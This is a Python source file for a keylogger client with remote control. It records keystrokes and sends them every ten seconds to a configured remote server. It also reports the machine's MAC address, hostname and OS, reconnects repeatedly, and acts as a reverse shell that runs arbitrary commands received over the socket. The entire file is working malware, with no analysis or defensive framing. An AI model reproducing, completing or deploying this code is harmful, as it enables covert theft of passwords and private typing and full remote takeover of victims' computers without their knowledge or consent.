import os
import time
import socket
import threading
import subprocess
import pynput.keyboard
import platform,re,uuid
from time import gmtime, strftime


class KeyloggerClient:

    def __init__(self, port1, port2, ip):
        self.log = ""
        self.host_ip = ip
        self.sock1 = None
        self.sock2 = None
        self.port1 = port1
        self.port2 = port2
        self.interval = 10
        self.logger_thread = None
        self._stop_keylogger_event = threading.Event()


    # append logged characters to log variable
    def append_string(self, keystrokes):
        self.log = self.log + keystrokes


    # log keystrokes
    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_string(current_key)


    # send logs server
    def send_logs(self):
        self.sock2.send(f"{strftime('%Y-%m-%d %H:%M:%S', gmtime())}: {self.log}\n".encode())
        print(self.log)
        self.log = ""


    # start the keylogger
    def start_keylogger(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            while not self._stop_keylogger_event.is_set():
                self.send_logs()
                time.sleep(self.interval)
            #keyboard_listener.join()


    # get system information to be sent back to the server
    def getSystemInfo(self):
        info = [
                ':'.join(re.findall('..', '%012x' % uuid.getnode())),
                socket.gethostname(),
                platform.system(),
                platform.release(),
                platform.processor().replace(',', '')
        ]
        return ",".join(info)


    # format text to bold and green
    def convert_text_bold_green(self, text):
        RESET = "\033[0m"
        BOLD = "\033[1m"
        COLOR = "\u001b[32m"
        return f"{BOLD}{COLOR}{text}{RESET}"


    # establish connection with the server
    def establishConnection(self):
        while True:
            try:
                self.sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock1.connect((self.host_ip, self.port1))
                print(f"[+]Session 1 has started on port {self.port1}")

                self.sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock2.connect((self.host_ip, self.port2))  # connect back to server
                print(f"[+]Session 2 has started on port {self.port2}")

                break
            except socket.error as err:
                print(err)
                time.sleep(120)  # try to reconnect after 2 minutes

        self.sock1.send(self.getSystemInfo().encode())

        while True:
            cmd = self.sock1.recv(4096).decode()

            if cmd == " ":
                self.sock1.send(f"{self.convert_text_bold_green('Remote-Logger')} {str(os.getcwd())}: ".encode())  # send current working directory back to server

            elif cmd == "conn check":
                pass

            elif cmd[:2] == 'cd':
                # change directory
                try:
                    os.chdir(cmd[3:])
                    result = subprocess.Popen(cmd, shell=True,
                                              stdout=subprocess.PIPE,
                                              stderr=subprocess.PIPE,
                                              stdin=subprocess.PIPE)
                    result = result.stdout.read() + result.stderr.read()
                    result = result.decode()

                    if "The system cannot find the path specified." in result:
                        self.sock1.send(f"{self.convert_text_bold_green('Remote-Logger')} {str(os.getcwd())}: ".encode())
                    else:
                        self.sock1.send(f"{self.convert_text_bold_green('Remote-Logger')} {str(os.getcwd())}: ".encode())
                except(FileNotFoundError, IOError):
                    self.sock1.send(f"[-]Directory does not exist!!! \n{self.convert_text_bold_green('Remote-Logger')} {str(os.getcwd())}: ".encode())


            elif cmd == 'start keylogger':
                # create sniffer threads
                self.logger_thread = threading.Thread(target=self.start_keylogger, daemon=True)
                self.logger_thread.start()

                print("[+]Keylogger started!")
                response = f"[+]Keylogger has started!\n{self.convert_text_bold_green('Remote-Logger')} {os.getcwd()}: "
                self.sock1.send(response.encode())


            elif cmd == 'stop keylogger':
                try:
                    if self.logger_thread.is_alive():
                        self._stop_keylogger_event.set()

                        self.logger_thread.join()
                        response = f"[+]Keylogger has stopped!\n{self.convert_text_bold_green('Remote-Logger')} {os.getcwd()}: "
                        self.sock1.send(response.encode())

                        self._stop_keylogger_event.clear()
                    else:
                        message = "Keylogger thread is not running or already stopped.\n"
                        response = f"{message}{self.convert_text_bold_green('Remote-Logger ')} {os.getcwd()}: "
                        self.sock1.send(response.encode())

                except Exception as e:
                    error_message = f"{e} \n"
                    response = f"{error_message}{self.convert_text_bold_green('Remote-Logger ')} {os.getcwd()}: "
                    self.sock1.send(response.encode())


            else:
                try:
                    # return terminal output back to server
                    terminal_output = subprocess.Popen(cmd, shell=True,
                                                       stdout=subprocess.PIPE,
                                                       stderr=subprocess.PIPE,
                                                       stdin=subprocess.PIPE)

                    terminal_output = terminal_output.stdout.read() + terminal_output.stderr.read()
                    terminal_output = terminal_output.decode()
                    output = f"{str(terminal_output)} \n{self.convert_text_bold_green('Remote-Logger')} {str(os.getcwd())}: "
                    self.sock1.send(output.encode())

                except Exception as e:
                    output = f"{str(e)} \n{self.convert_text_bold_green('Remote-Logger')} {str(os.getcwd())}: "
                    self.sock1.send(output.encode())

